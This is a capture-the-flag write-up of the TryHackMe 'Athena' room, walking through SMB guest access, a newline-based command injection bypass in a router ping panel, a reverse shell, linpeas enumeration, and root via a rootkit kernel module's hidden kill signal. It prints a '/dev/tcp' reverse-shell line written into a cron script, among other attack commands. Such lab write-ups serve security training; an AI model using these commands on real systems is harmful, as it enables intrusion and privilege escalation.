---
title: Athena
tags:
  - thm
  - medium
---

#### Author: AMD

![[static/athena/athena.webp]]

This is a writeup for <b>Athena</b> room.

My target IP: 10.10.231.238

-----------------------------------------------------------------------------------
<b>NMAP</b>

Lets scan out target.

![[static/athena/nmap.webp]]

-----------------------------------------------------------------------------------
<b>RESEARCH</b>

Let's see what unusual ports used for.

![[static/athena/research.webp]]

-----------------------------------------------------------------------------------
<b>SMB CLIENT CONNECTION</b>

Let's list SMB shares that are accessible as guest. (-N)

![[static/athena/smbclient_list.webp]]

![[static/athena/smbclient_ipc.webp]]

![[static/athena/smbclient_public.webp]]

We are in.

-----------------------------------------------------------------------------------
<b>SMB CLIENT</b>

Let's look around.

![[static/athena/smbclient_ls.webp]]

Run "vim msg_for_administrator.txt"

![[static/athena/msg_for_administrator.webp]]

-----------------------------------------------------------------------------------
<b>ROUTER PANEL</b>

![[static/athena/router_panel.webp]]

Let's try whoami.

![[static/athena/whoami.webp]]

![[static/athena/whoami_result.webp]]

-----------------------------------------------------------------------------------
<b>INJECTION</b>

Input "dummy", catch the request with Burp Suite and send to repeater.

All attempts ends up with "Attempt hacking!" or "Failed to execute ping." if they contain characters like ';' '|' '&' etc. But '\n' (%0a) works

![[static/athena/id.webp]]

![[static/athena/passwd.webp]]

-----------------------------------------------------------------------------------
<b>REVERSE SHELL</b>

run "nc -lvnp 4444"

![[static/athena/reverse_shell_burp.webp]]

![[static/athena/conn_received.webp]]

We need to connect user athena.

-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 1</b>

run "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" to get linpeas.sh on your pc.

run "python3 -m http.server 8080" on your pc to host it.  (Close Burp or change port)

run "wget http://YOUR-IP:8080/linpeas.sh -O /tmp/linpeas.sh"

run "chmod +x /tmp/linpeas.sh" to make it executable

run "/tmp/linpeas.sh"

![[static/athena/backup_sh.webp]]

![[static/athena/backup_sh_perms.webp]]

-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 2</b>

run "echo 'bash -i >& /dev/tcp/YOUR-IP/9001 0>&1' > /usr/share/backup/backup.sh"

run "nc -lvnp 9001" on your pc,

![[static/athena/user_athena.webp]]

-----------------------------------------------------------------------------------
<b>GET USER FLAG</b>

![[static/athena/user_flag.webp]]

-----------------------------------------------------------------------------------
<b>USER athena PERMISSION</b>

![[static/athena/user_athena_perm.webp]]

-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 3</b>

![[static/athena/venom_ko_perms.webp]]

It is readable. Lets get it

![[static/athena/venom_web_server.webp]]

![[static/athena/get_venom.webp]]

-----------------------------------------------------------------------------------
<b>INSPECT venom.ko</b>

Fire up Ghidra and open venom.ko

Under functions find give_root function.

![[static/athena/give_root.webp]]

Other weird funciton is hacked_kill.

![[static/athena/hacked_kill.webp]]

![[static/athena/root_call.webp]]

If we kill the process 57 (0x39) we can become root.

-----------------------------------------------------------------------------------
<b>PRIVILEGE EXCALTION PART 4</b>

run "sudo /usr/sbin/insmod /mnt/.../secret/venom.ko"

run "kill -57 0"

run "id"

-----------------------------------------------------------------------------------
<b>GET ROOT FLAG</b>

run "cd /root"

run "cat root.txt"

![[static/athena/root_flag.webp]]
